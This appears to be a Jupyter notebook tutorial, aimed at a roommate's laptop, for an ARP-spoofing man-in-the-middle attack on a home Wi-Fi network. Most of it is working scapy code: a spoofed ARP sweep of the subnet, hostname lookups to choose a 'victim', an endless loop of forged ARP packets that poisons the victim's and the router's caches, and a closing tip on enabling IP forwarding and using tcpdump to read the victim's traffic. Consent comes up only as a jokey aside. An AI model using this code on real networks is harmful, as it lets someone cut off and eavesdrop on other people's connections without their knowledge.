{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# MITM - Get into your Roomates Laptop\n",
    "### Inform him beforehand😊 "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " Import \n",
    "   - Socket for check our network interface and connetivity to internet\n",
    "   - netifaces is used to extract MAC address for the Cicim IP address from the Dicionary of victims\n",
    "   - Netaddr is used to import all generally used network commands for python packages"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket   \n",
    "import netifaces\n",
    "from netaddr import *"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<br>\n",
    "\n",
    "- Now we'll get our private IP address to find the subnet in which we are.\n",
    "- This is done because some Wi-Fi will use 192.168 or 172.16 or 10.0 for Guest networks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n",
    "s.connect((\"8.8.8.8\", 80))\n",
    "myip = s.getsockname()[0]\n",
    "s.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'192.168.0.166'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "myip"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- I used /24 as subnet here because /16 or /8 will take huge time to ARPing.\n",
    "- Sometime in the process of scanning /16 networks, local Wi-Fi AP has a chance to block your IP for abnormal activities. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "subnet = '/24' # Find a way to get subnet mask\n",
    "myipadd = str(IPNetwork(myip + subnet).network) + subnet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'192.168.0.0/24'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "myipadd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<br>\n",
    "<br>\n",
    "\n",
    "- Now We'll ARPing the subnet with spoofed IP\n",
    "- Broadcast is addressed to ff:ff:ff:ff:ff:ff\n",
    "- I'm appending the findings in a list as dictionaries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Wall time: 10.7 s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "client = []\n",
    "from scapy.all import *\n",
    "def scan1(ip):\n",
    "    arp_packet = ARP(psrc='192.168.0.150', pdst=ip)\n",
    "    broadcast_packet = Ether(dst = \"ff:ff:ff:ff:ff:ff\")\n",
    "    arp_broadcast_packet = broadcast_packet/arp_packet\n",
    "    answered_list = srp(arp_broadcast_packet, timeout = 1, verbose = False)[0]\n",
    "    \n",
    "    for sent,received in answered_list:\n",
    "        client.append({'IP':received.psrc, 'MAC':received.hwsrc})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "scan1(myipadd)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- Here, we're locally doing nslookup for all the IP address that replied to our ARPing. \n",
    "- This gives more power over choosing our victim "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[{'IP': '192.168.0.1', 'MAC': 'b0:52:16:f8:34:dd', 'DNS': 'Not Found'}, {'IP': '192.168.0.113', 'MAC': '20:79:18:2a:2f:e7', 'DNS': 'sid-pc'}, {'IP': '192.168.0.131', 'MAC': '8c:85:90:5c:2d:94', 'DNS': 'vulkan'}, {'IP': '192.168.0.132', 'MAC': '30:24:32:93:a1:84', 'DNS': 'desktop-tjei1dr'}, {'IP': '192.168.0.130', 'MAC': '24:18:1d:be:ff:9e', 'DNS': 'galaxy-s9'}, {'IP': '192.168.0.148', 'MAC': 'e4:f8:9c:82:bd:4c', 'DNS': 'lenovo-pc'}]\n",
      "Wall time: 27.5 s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "for i in range (0,len(client)):\n",
    "    try:\n",
    "        client[i]['DNS'] = socket.gethostbyaddr(str(client[i]['IP']))[0]\n",
    "    except:\n",
    "        client[i]['DNS'] = 'Not Found'\n",
    "        continue\n",
    "print(client)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<br>\n",
    "<br>\n",
    "Select a victim from the pool of devices available"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter the Victim IP192.168.0.113\n"
     ]
    }
   ],
   "source": [
    "victimIP = input('Enter the Victim IP')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "gws=netifaces.gateways()\n",
    "gatewayip = ((gws['default'])[2])[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'192.168.0.1'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "gatewayip"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- To carry out MITM, we need to spoof the MAC table of the victim and AP\n",
    "- So, we're grabbing them from our list"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range (0,len(client)):\n",
    "    if client[i]['IP'] == gatewayip:\n",
    "        gatewayMAC = (client[i]['MAC'])\n",
    "           \n",
    "for i in range (0,len(client)):\n",
    "    if client[i]['IP'] == victimIP:\n",
    "        victimMAC = (client[i]['MAC'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Now, its time to attack!!!!**\n",
    "<br>\n",
    "\n",
    "- Lauch the attack in indefinite loop, which can be stopped only with keyboard interruption.\n",
    "- This loop is to have longer access instead of sending few packets which will finish the attack in few seconds"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "while True:\n",
    "    packet = ARP(op=1, pdst=victimIP, hwdst= victimMAC, psrc= gatewayip)\n",
    "    send(packet) #Packet telling the Victim (with ip address 192.168.111.157) that the hacker is the Router.\n",
    "\n",
    "    packet = ARP(op=1, pdst= gatewayip , hwdst=gatewayMAC, psrc= victimIP)\n",
    "    send(packet) #Packet telling the Router (with ip address 192.168.111.2) that the hacker is the Victim."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- Basically, the subprocess command you can see below is not related to this code.\n",
    "- But it can be done for nslookups through CMD instead of python packages\n",
    "\n",
    "*Just for Reference*"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "''' Running command in CMD - Not req. for this project\n",
    "\n",
    "import subprocess\n",
    "\n",
    "from subprocess import PIPE, Popen\n",
    "def cmdline(command):\n",
    "    process = Popen(\n",
    "        args=command,\n",
    "        stdout=PIPE,\n",
    "        shell=True\n",
    "    )\n",
    "    return process.communicate()[0]\n",
    "\n",
    "cmdline(\"nslookup 192.168.0.113\")'''\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- This project basically interrupts the internet connectivity for the Victim\n",
    "- Incase, to have access to their streaming data, run the program on linux with \"ipforwarding\" enabled\n",
    "- Open a terminal and type \"sudo tcpdump | grep *victimIP*\" to get packets in human readable form"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
